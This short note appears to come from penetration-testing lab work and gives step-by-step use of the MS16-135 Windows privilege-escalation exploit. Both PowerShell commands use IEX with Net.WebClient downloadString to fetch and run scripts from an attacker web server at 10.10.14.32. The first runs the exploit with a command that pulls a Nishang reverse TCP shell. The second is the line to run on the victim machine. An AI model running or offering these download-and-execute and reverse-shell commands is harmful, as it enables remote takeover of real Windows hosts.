# MS16-135 Win23k
source: https://github.com/EmpireProject/Empire/raw/master/data/module_source/privesc/Invoke-MS16135.ps1

1) Edit ps script at the end of the content to include the following command for executing exploit to trigger nishang reverse powershell (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) which is renamed as `shell.ps1`
```powershell
Invoke-MS16032 -Command "IEX (New-Object Net.WebClient).downloadString('http://10.10.14.32/shell.ps1')"
```

2) Host this file in webserver in your kali machine, you should also host tcp reverse named 'shell.ps1'

3) In victim machine, run command :
```powershell
IEX (New-Object Net.WebClient).downloadString('http://10.10.14.32/Invoke-MS16135.ps1')
```
